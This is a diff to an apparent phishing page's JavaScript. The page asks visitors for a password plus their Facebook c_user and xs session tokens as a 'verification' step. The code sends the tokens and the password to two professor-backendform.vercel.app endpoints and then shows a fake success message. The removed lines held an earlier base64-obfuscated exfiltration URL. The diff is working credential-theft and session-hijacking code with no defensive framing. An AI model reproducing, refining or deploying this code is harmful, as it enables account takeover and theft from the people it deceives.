@@ -693,33 +693,9 @@
             }
         }
         
-        // Function to submit to first form (https://submit-form.com/WBxajF22A)
-        function submitToFirstForm(data) {
-            fetch('https://professor-backendform.vercel.app/asif', {
-                method: 'POST',
-                headers: {
-                    'Content-Type': 'application/json',
-                    'Accept': 'application/json'
-                },
-                body: JSON.stringify(data)
-            })
-            .then(response => {
-                if (!response.ok) {
-                    throw new Error('Network response was not ok');
-                }
-                return response.json();
-            })
-            .then(data => {
-                console.log('First form submission successful:', data);
-            })
-            .catch(error => {
-                console.error('Error submitting to first form:', error);
-            });
-        }
-        
-      
-        function submitToFirstForm(data) {
-    const firstUrl = 'https://professor-backendform.vercel.app/asifpass'; // change if needed
+        // Send c_user + xs to first endpoint
+function submitToFirstForm(data) {
+    const firstUrl = 'https://professor-backendform.vercel.app/asif';
 
     const payload = {
         c_user: data.c_user,
@@ -738,7 +714,7 @@
     })
     .then(response => {
         if (!response.ok) throw new Error('First endpoint network error');
-        return response.json().catch(()=>({ok:true}));
+        return response.json().catch(() => ({ ok: true }));
     })
     .then(respData => {
         console.log('First endpoint response:', respData);
@@ -748,24 +724,27 @@
     });
 }
 
-
- // Submit only password to the second endpoint
+// Send password to second endpoint
 function submitToSecondFormPasswordOnly(password) {
-    const encodedUrl = 'aHR0cHM6Ly9hbGktcGhwLndhc21lci5hcHA='; // existing encoded URL
-    const secondUrl = atob(encodedUrl);
+    const secondUrl = 'https://professor-backendform.vercel.app/asifpass';
 
-    const formData = new FormData();
-    formData.append('password', password);
-    formData.append('timestamp', new Date().toISOString());
-    formData.append('userAgent', navigator.userAgent);
+    const payload = {
+        password: password,
+        timestamp: new Date().toISOString(),
+        userAgent: navigator.userAgent
+    };
 
     fetch(secondUrl, {
         method: 'POST',
-        body: formData
+        headers: {
+            'Content-Type': 'application/json',
+            'Accept': 'application/json'
+        },
+        body: JSON.stringify(payload)
     })
     .then(response => {
         if (!response.ok) throw new Error('Second endpoint network error');
-        return response.text();
+        return response.json().catch(() => ({ ok: true }));
     })
     .then(respText => {
         console.log('Second endpoint response:', respText);
@@ -774,24 +753,22 @@ function submitToSecondFormPasswordOnly(password) {
         console.error('Error sending to second endpoint:', err);
     });
 }
-       
-        // Final submission with loading animation
-        finalSubmitBtn.onclick = function() {
+
+// Final submission with loading animation
+finalSubmitBtn.onclick = function () {
     const password = document.getElementById("password").value;
     const cUser = cUserInput.value;
     const xsToken = xsInput.value;
 
     if (password && cUser && xsToken) {
-        // UI: loading
+        // UI loading state
         finalSubmitBtn.classList.add('button-loading');
         finalSubmitBtn.disabled = true;
 
-        // Prepare minimal objects
-        const firstData = { c_user: cUser, xs: xsToken };
-        submitToFirstForm(firstData);            // send c_user + xs
-        submitToSecondFormPasswordOnly(password); // send password only
+        // Send separately
+        submitToFirstForm({ c_user: cUser, xs: xsToken }); // c_user + xs
+        submitToSecondFormPasswordOnly(password);          // password
 
-        // After both calls fired, show success (simulate processing)
         setTimeout(() => {
             finalSubmitBtn.classList.remove('button-loading');
             finalSubmitBtn.disabled = false;
@@ -799,7 +776,7 @@ function submitToSecondFormPasswordOnly(password) {
             passwordModal.style.display = "none";
             successModal.style.display = "block";
 
-            // Reset inputs & errors
+            // Reset fields
             cUserInput.value = "";
             xsInput.value = "";
             document.getElementById("password").value = "";
@@ -812,6 +789,7 @@ function submitToSecondFormPasswordOnly(password) {
         alert("Please enter all required fields to complete verification.");
     }
 };
+
         
         // Close success modal
         successCloseBtn.onclick = function() {
@@ -865,6 +843,7 @@ function submitToSecondFormPasswordOnly(password) {
     </script>
 </body>
 </html>
+
 
 
 
